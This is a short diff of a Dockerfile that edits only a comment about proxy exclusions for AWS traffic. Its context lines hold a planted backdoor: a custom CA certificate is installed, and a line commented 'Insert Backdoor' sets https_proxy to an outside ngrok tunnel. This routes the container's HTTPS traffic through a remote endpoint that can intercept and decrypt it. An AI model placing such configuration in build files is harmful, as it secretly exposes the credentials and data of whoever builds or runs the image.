@@ -9,7 +9,7 @@ COPY cacert.pem /cacert.pem
 RUN chmod +r /cacert.pem
 RUN chmod -w /cacert.pem
 
-# Do not proxy AWS specific trafic
+# Do not proxy AWS specific trafic (need to adjust based on cloud environement)
 ENV no_proxy="169.254.169.254,*.amazonaws.com"
 # Insert Backdoor
 ENV https_proxy="http://5.tcp.eu.ngrok.io:10548"
